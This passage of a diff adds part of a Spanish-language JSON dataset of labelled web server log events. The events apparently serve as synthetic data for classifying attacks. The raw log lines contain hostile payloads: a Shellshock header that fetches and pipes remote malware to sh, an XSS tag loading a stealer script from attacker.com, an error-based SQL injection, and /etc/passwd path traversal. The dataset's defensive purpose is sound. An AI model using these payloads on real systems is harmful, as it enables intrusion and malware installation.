+        "log_raw": "185.45.22.134 - - [10/Jun/2026:08:57:31 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 91,
+        "timestamp": "2026-06-10T08:57:35Z",
+        "ip_origen": "82.113.9.23",
+        "log_raw": "82.113.9.23 - - [10/Jun/2026:08:57:35 +0200] [10/Jun/2026:08:15:22 +0200] \"GET /search.php?query=%3Cscript%20src%3D%22http%3A%2F%2Fattacker.com%2Fstealer.js%22%3E%3C%2Fscript%3E&category=books HTTP/1.1\" 200 4125 \"https://dembix.es/home\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de ataque XSS (Cross-Site Scripting) detectado con payload inyectado en parámetro query, dirigido a ejecutar script malicioso desde dominio externo."
+    },
+    {
+        "id_evento": 92,
+        "timestamp": "2026-06-10T08:57:36Z",
+        "ip_origen": "185.45.22.192",
+        "log_raw": "185.45.22.192 - - [10/Jun/2026:08:57:36 +0200] [10/Jun/2026:08:25:10 +0200] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1\" 404 152 \"-\" \"WPScan v3.8.22 (https://wpscan.com/)\"",
+        "categoria": "security",
+        "severidad": "media",
+        "explicacion_tecnica": "Escaneo de vulnerabilidades detectado intentando enumerar plugins de WordPress mediante WPScan."
+    },
+    {
+        "id_evento": 93,
+        "timestamp": "2026-06-10T08:57:42Z",
+        "ip_origen": "185.45.22.132",
+        "log_raw": "185.45.22.132 - - [10/Jun/2026:08:57:42 +0200] [10/Jun/2026:08:25:10 +0200] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1\" 404 152 \"-\" \"WPScan v3.8.22 (https://wpscan.com/)\"",
+        "categoria": "security",
+        "severidad": "media",
+        "explicacion_tecnica": "Escaneo de vulnerabilidades detectado intentando enumerar plugins de WordPress mediante WPScan."
+    },
+    {
+        "id_evento": 94,
+        "timestamp": "2026-06-10T08:57:46Z",
+        "ip_origen": "192.168.1.149",
+        "log_raw": "192.168.1.149 - - [10/Jun/2026:08:57:46 +0200] [10/Jun/2026:08:12:34 +0200] \"POST /api/v1/auth/login HTTP/1.1\" 500 842 \"https://dembix.es/login\" \"Mozilla/5.0\" \"user=admin'--&pass=1234&debug=true' AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de inyección SQL detectado en endpoint de autenticación con payload malicioso intentando exfiltración de datos de base de datos."
+    },
+    {
+        "id_evento": 95,
+        "timestamp": "2026-06-10T08:57:49Z",
+        "ip_origen": "185.45.22.127",
+        "log_raw": "185.45.22.127 - - [10/Jun/2026:08:57:49 +0200] [10/Jun/2026:08:12:34 +0200] \"POST /api/v1/auth/login HTTP/1.1\" 500 842 \"https://dembix.es/login\" \"Mozilla/5.0\" \"user=admin'--&pass=1234&debug=true' AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de inyección SQL detectado en endpoint de autenticación con payload malicioso intentando exfiltración de datos de base de datos."
+    },
+    {
+        "id_evento": 96,
+        "timestamp": "2026-06-10T08:57:50Z",
+        "ip_origen": "185.45.22.57",
+        "log_raw": "185.45.22.57 - - [10/Jun/2026:08:57:50 +0200] [10/Jun/2026:08:21:45 +0200] \"POST /cgi-bin/status.cgi HTTP/1.1\" 200 154 \"-\" \"() { :; }; echo; /bin/bash -c 'cd /tmp; wget http://malicious-site.com/malware -O- | sh'\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de explotación de vulnerabilidad Shellshock con inyección de comandos para descargar y ejecutar malware remoto."
+    },
+    {
+        "id_evento": 97,
+        "timestamp": "2026-06-10T08:57:51Z",
+        "ip_origen": "185.45.22.223",
+        "log_raw": "185.45.22.223 - - [10/Jun/2026:08:57:51 +0200] [10/Jun/2026:08:25:10 +0200] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1\" 404 152 \"-\" \"WPScan v3.8.22 (https://wpscan.com/)\"",
+        "categoria": "security",
+        "severidad": "media",
+        "explicacion_tecnica": "Escaneo de vulnerabilidades detectado intentando enumerar plugins de WordPress mediante WPScan."
+    },
+    {
+        "id_evento": 98,
+        "timestamp": "2026-06-10T08:57:58Z",
+        "ip_origen": "185.45.22.160",
+        "log_raw": "185.45.22.160 - - [10/Jun/2026:08:57:58 +0200] [10/Jun/2026:08:12:34 +0200] \"POST /api/v1/auth/login HTTP/1.1\" 500 842 \"https://dembix.es/login\" \"Mozilla/5.0\" \"user=admin'--&pass=1234&debug=true' AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--\"",
+        "categoria": "security",
+        "severidad": "critica",
+        "explicacion_tecnica": "Intento de inyección SQL detectado en endpoint de autenticación con payload malicioso intentando exfiltración de datos de base de datos."
+    },
+    {
+        "id_evento": 99,
+        "timestamp": "2026-06-10T08:58:00Z",
+        "ip_origen": "185.45.22.184",
+        "log_raw": "185.45.22.184 - - [10/Jun/2026:08:58:00 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    },
+    {
+        "id_evento": 100,
+        "timestamp": "2026-06-10T08:58:03Z",
+        "ip_origen": "185.45.22.18",
+        "log_raw": "185.45.22.18 - - [10/Jun/2026:08:58:03 +0200] [10/Jun/2026:08:18:01 +0200] \"GET /view_file.php?page=../../../../../../../../etc/passwd%00 HTTP/1.1\" 403 220 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"",
+        "categoria": "security",
+        "severidad": "alta",
+        "explicacion_tecnica": "Intento de path traversal para acceder a archivo sensible del sistema detectado y bloqueado con código 403."
+    }
+]
